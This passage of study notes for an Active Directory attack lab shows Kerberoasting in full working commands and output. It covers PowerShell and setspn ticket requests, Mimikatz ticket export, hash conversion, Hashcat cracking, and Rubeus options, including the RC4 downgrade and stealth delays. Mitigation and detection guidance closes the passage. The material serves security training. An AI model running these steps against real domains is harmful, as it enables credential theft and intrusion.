New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

**Command Breakdown:**
- `Add-Type -AssemblyName System.IdentityModel` — Loads the `System.IdentityModel` .NET assembly into the PowerShell session. This namespace contains classes for building security tokens including Kerberos.
- `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken` — Creates a new Kerberos security token — this action automatically sends a TGS request to the KDC and loads the ticket into the current session's Kerberos cache (in LSASS memory)
- `-ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"` — The SPN to request a ticket for

This is essentially what Rubeus does internally with its default Kerberoasting method.

**Retrieving all tickets for all SPNs at once:**

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

**Command Breakdown:**
- `setspn.exe -T INLANEFREIGHT.LOCAL -Q */*` — Queries all SPNs in the domain
- `| Select-String '^CN' -Context 0,1` — Finds lines starting with `CN` (account Distinguished Name) and includes 1 line of context after (the SPN line)
- `| % { New-Object ... -ArgumentList $_.Context.PostContext[0].Trim() }` — For each SPN found, requests a TGS ticket. `$_.Context.PostContext[0].Trim()` extracts the SPN value and trims whitespace.

Note: this also pulls computer account tickets — those can be ignored since they can't be cracked.

---

### Extracting Tickets with Mimikatz

Once TGS tickets are loaded in memory (from the requests above), we use **Mimikatz** to extract them.

```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

**Command Breakdown:**
- `base64 /out:true` — Tells Mimikatz to output ticket data as a **base64 blob** instead of writing `.kirbi` files directly to disk. Useful for copy-pasting the ticket out over a terminal without needing file transfer.
- `kerberos::list /export` — Lists all Kerberos tickets in the current logon session and exports them — either as base64 (if the above flag is set) or as `.kirbi` files on disk.

The output will show the ticket details (Server Name, Client Name, Flags, encryption type `0x00000017` = RC4) followed by a large base64 blob. Copy that blob for the next step.

> **Note:** If you skip `base64 /out:true`, Mimikatz writes `.kirbi` files directly to disk. You can then run `kirbi2john.py` against them directly, skipping the base64 decode step entirely.

---

#### Preparing the Base64 Blob for Cracking

The base64 output from Mimikatz is column-wrapped (split across multiple lines). Before we can decode it, we need it all on one single line:

```bash
echo "<base64 blob>" | tr -d \\n
```

**Command Breakdown:**
- `echo "<base64 blob>"` — Prints the base64 blob copied from Mimikatz output
- `| tr -d \\n` — Pipes it to `tr` which **deletes** (`-d`) all newline characters (`\\n`), collapsing everything into a single continuous string

This gives us one clean line of base64 that can be decoded.

---

#### Placing the Output into a File as .kirbi

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

**Command Breakdown:**
- `cat encoded_file` — Reads the file containing the single-line base64 string
- `| base64 -d` — Decodes the base64 back to binary — this is the raw Kerberos ticket in `.kirbi` format (the native Kerberos credential cache format used by Windows)
- `> sqldev.kirbi` — Writes the decoded binary to a `.kirbi` file

---

#### Extracting the Kerberos Ticket using kirbi2john.py

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

**Command Breakdown:**
- `kirbi2john.py` — A Python 2 script that reads a `.kirbi` Kerberos ticket file and converts it into a format that John the Ripper (and Hashcat) can crack
- `sqldev.kirbi` — The decoded ticket file from the previous step

This creates a file called `crack_file` containing the extracted hash.

---

#### Modifying crack_file for Hashcat

The output from `kirbi2john.py` needs a small format adjustment before Hashcat can process it:

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

**Command Breakdown:**
- `sed 's/pattern/replacement/'` — Stream editor performing a regex substitution on each line
- The regex reformats the hash from John format (`$krb5tgs$...:...`) to Hashcat mode 13100 format (`$krb5tgs$23$*...*$...`)
- `crack_file` — Input file from kirbi2john.py
- `> sqldev_tgs_hashcat` — Writes the reformatted hash to a new file ready for Hashcat

You can verify the output looks correct with:

```bash
cat sqldev_tgs_hashcat
```

The hash should start with `$krb5tgs$23$*sqldev.kirbi*$...`

---

#### Cracking the Hash with Hashcat

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

**Command Breakdown:**
- `-m 13100` — Hashcat mode for **Kerberos 5, etype 23, TGS-REP** (RC4-HMAC)
- `sqldev_tgs_hashcat` — The reformatted hash file
- `/usr/share/wordlists/rockyou.txt` — The wordlist

Result: `database!` — same password, confirming the manual method produces the same crackable hash as the automated approach.

---

### Automated Kerberoasting with PowerView

Most assessments are time-boxed — we need to work quickly and efficiently. The manual Mimikatz method works, but automated tools get us there faster. Here are two quick approaches: **PowerView** and **Rubeus**.

**Enumerating SPN accounts with PowerView:**

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

**Example output:**

```
samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

**Requesting TGS ticket for a specific user in Hashcat format:**

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

**Command Breakdown:**
- `Get-DomainUser -Identity sqldev` — Retrieves the AD user object for `sqldev`
- `| Get-DomainSPNTicket -Format Hashcat` — Requests the TGS ticket and outputs it directly in Hashcat-ready format

**Example output:**

```
SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001
                       376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609...
```

The hash is already in Hashcat mode 13100 format — just copy the value after `Hash :` and feed it to Hashcat.

**Exporting all TGS tickets to CSV:**

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

**Command Breakdown:**
- `Get-DomainUser * -SPN` — Gets all domain users with SPNs set
- `| Get-DomainSPNTicket -Format Hashcat` — Requests TGS tickets for all of them in Hashcat format
- `| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` — Exports all results to a CSV. `-NoTypeInformation` removes the `#TYPE` header line.

**Viewing the CSV contents:**

```powershell
cat .\ilfreight_tgs.csv
```

**Example output:**

```
"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"adfs","CN=adfs,OU=Service Accounts,...","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE..."
```

The CSV can be parsed to extract just the `Hash` column for feeding to Hashcat in bulk.

---

### Kerberoasting with Rubeus

**Rubeus** is a C# toolset for Kerberos interaction and abuses, from GhostPack. It's the most capable tool for Kerberoasting from Windows — it handles SPN enumeration, ticket requesting, and output formatting all in one command. Running `.\Rubeus.exe` without flags shows the full menu of capabilities:

**Key Rubeus Kerberoasting options:**
- `kerberoast /spn:"blah/blah"` — Kerberoast a specific SPN
- `kerberoast /outfile:hashes.txt` — Output hashes to a file
- `kerberoast /simple` — Output hashes to console in file format
- `kerberoast /creduser:DOMAIN\USER /credpassword:PASS` — Use alternate credentials
- `kerberoast /ticket:BASE64` — Use an existing TGT
- `kerberoast /usetgtdeleg` — Use TGT delegation to request RC4 tickets (downgrade)
- `kerberoast /rc4opsec` — "Opsec" mode — uses tgtdeleg and filters out AES-only accounts
- `kerberoast /stats` — List stats without sending ticket requests
- `kerberoast /ldapfilter:'admincount=1'` — Target only protected group members
- `kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5` — Target accounts by password age with a result limit
- `kerberoast /delay:5000 /jitter:30` — Add delay and jitter between requests (stealth)
- `kerberoast /aes` — Request AES tickets only

**Viewing statistics about Kerberoastable accounts:**

```powershell
.\Rubeus.exe kerberoast /stats
```

**Command Breakdown:**
- `/stats` — Lists statistics about found Kerberoastable accounts **without actually sending ticket requests**. Shows counts by encryption type and password last set year — use this first before making noise.

**Full example output:**

```
[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for
    '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)
    (!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 9

 ------------------------------------------------------------
 | Supported Encryption Type                        | Count |
 ------------------------------------------------------------
 | RC4_HMAC_DEFAULT                                 | 7     |
 | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
 ------------------------------------------------------------

 ----------------------------------
 | Password Last Set Year | Count |
 ----------------------------------
 | 2022                   | 9     |
 ----------------------------------
```

From this: 9 Kerberoastable accounts, 7 RC4 (fast to crack), 2 AES-only (slower). All passwords set in 2022. Accounts with passwords set 5+ years ago are higher-value targets — may have been weak passwords set when the org was less security-mature.

**Kerberoasting high-value accounts only (admincount=1):**

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

**Command Breakdown:**
- `/ldapfilter:'admincount=1'` — Targets only accounts with `admincount=1` — members of protected groups like Domain Admins. Highest-value targets first.
- `/nowrap` — Prevents line-wrapping on base64 blobs — paste directly into Hashcat without editing

**Full example output:**

```
[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Total kerberoastable users : 3

[*] SamAccountName         : backupagent
[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local
[*] PwdLastSet             : 2/15/2022 2:15:40 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*$750F377DEFA85A67EA0FE51B0B28F83D$...
```

3 high-value accounts — all protected group members. `backupagent` uses RC4 — crack this first.

**Kerberoasting a specific user:**

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

**Example output (RC4 account):**

```
[*] SamAccountName         : testspn
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$CEA71B221FC2C00F8886261660536CC1$...
```

**Verifying encryption type with PowerView:**

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

**Output (RC4 default — value 0):**

```
serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                             0 testspn
```

`0` = no specific type defined → defaults to RC4_HMAC_MD5.

**Cracking the RC4 ticket:**

```bash
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

**Full cracking output:**

```
Status.......: Cracked
Hash.Name....: Kerberos 5, etype 23, TGS-REP
Time.Started.: Sun Feb 27 15:36:58 2022 (4 secs)
Speed.#1.....:   693.3 kH/s
Recovered....: 1/1 (100.00%) Digests

$krb5tgs$23$*testspn$...:welcome1$
```

Password `welcome1$` cracked in **4 seconds** on a CPU.

---

#### A Note on Encryption Types

> **Note:** The AES examples below are not reproducible in the module lab — the DC runs Windows Server 2019. Details at the end of this section.

When an account is configured for AES only (`msds-supportedencryptiontypes = 24`):

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

**Output (AES account — value 24):**

```
serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            24 testspn
```

`24` = AES128 + AES256 only.

**Requesting ticket for an AES account gives type 18 hash:**

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

```
[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
[*] Hash                   : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inlanefreight.local*$8939F8C5B97A4CAA170AD706$...
```

**Cracking AES-256 with Hashcat:**

```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

**Status while running (22+ minutes estimated):**

```
Status.......: Running
Hash.Name....: Kerberos 5, etype 18, TGS-REP
Time.Estimated: Sun Feb 27 16:31:06 2022 (22 mins, 19 secs remaining)
Speed.#1.....:    10277 H/s
```

**Final result:**

```
Status.......: Cracked
Time.Started.: Sun Feb 27 16:07:50 2022 (4 mins, 36 secs)
Recovered....: 1/1 (100.00%) Digests
```

Same password: **4 seconds for RC4** vs **4 mins 36 secs for AES-256** on the same CPU. On a real GPU rig the times drop but the ratio remains — RC4 always cracks far faster.

**Encryption type values summary:**

| Value | Meaning |
|---|---|
| `0` | Not defined → defaults to RC4 |
| `17` | AES128 only |
| `18` | AES256 only |
| `24` | AES128 + AES256 |
| `31` | All types including DES and RC4 |

**Downgrading AES accounts to RC4 with `/tgtdeleg`:**

```powershell
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```

Even for AES-configured accounts, this requests an RC4 ticket by using TGT delegation — Rubeus gets a TGT via credential delegation then uses it to request a service ticket specifying only RC4. The output will show `RC4_HMAC_DEFAULT` even though the account supports AES — cutting cracking time from minutes to seconds.

> **Important:** `/tgtdeleg` does **NOT** work against **Windows Server 2019** DCs. AES-enabled accounts on Server 2019 will always return AES. On **Server 2016 and earlier** the downgrade works. This is a critical distinction — check your DC version before relying on this.

**Group Policy note:** Kerberos encryption types can be restricted via `Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options > Network security: Configure encryption types allowed for Kerberos`. Removing AES entirely would be a security flaw and should never be done. Removing RC4 forces AES tickets everywhere but must be tested thoroughly before implementation as it can break legacy services.

---

### Mitigation & Detection for Kerberoasting

**Mitigation:**
- Use **Group Managed Service Accounts (gMSA)** for service accounts — they use auto-rotating complex passwords that are essentially impossible to crack offline. This is the best fix.
- If standard accounts must be used as SPNs, enforce long passphrases that don't appear in any wordlist
- Remove SPNs from accounts that don't genuinely require them
- Don't add service accounts to privileged groups like Domain Admins unless absolutely necessary

**Detection:**
- Enable **Kerberos Service Ticket auditing** in Group Policy: `Audit Kerberos Service Ticket Operations` — this generates:
  - **Event ID 4769** — A Kerberos service ticket (TGS) was requested
  - **Event ID 4770** — A Kerberos service ticket was renewed
- Monitor for a **large number of Event ID 4769 events in a short period from a single source** — this is the primary Kerberoasting indicator. Normal environments generate some 4769 events, but a burst of them from one IP targeting many different service accounts is suspicious.
- Pay special attention to 4769 events where the **Ticket Encryption Type is `0x17`** (hex for decimal 23 = RC4-HMAC) — most modern environments should be using AES, so RC4 TGS requests are a strong indicator of Kerberoasting activity. Defenders can tune their SIEM to alert specifically on this condition.

---

### Continuing Onwards

Once we have a set of cracked credentials from Kerberoasting, we have multiple paths forward depending on the privilege level of the account we compromised:

- **Access a host via RDP or WinRM** — as a local user or local admin, giving us an interactive session on the target
- **Authenticate to a remote host as admin using PsExec** — if the account has local admin rights we can get a shell
- **Gain access to sensitive file shares** — the account may have READ/WRITE access to shares containing credentials, configs, or other sensitive data
- **Gain MSSQL access as a DBA user** — if the cracked account was an SQL service account, we may be able to connect to the database, enable `xp_cmdshell`, and gain code execution on the SQL server
- **Continue domain enumeration** — even a low-privilege domain account opens up all the AD enumeration techniques covered earlier in this module

Regardless of what access the cracked account provides, we should continue digging deeper into the domain for other flaws and misconfigurations — Kerberoasting is one path to access, but rarely the only one. Every new set of credentials opens new doors.

---

*End of Notes — Active Directory Enumeration & Attacks (Sections 1, 4-18 Complete)*
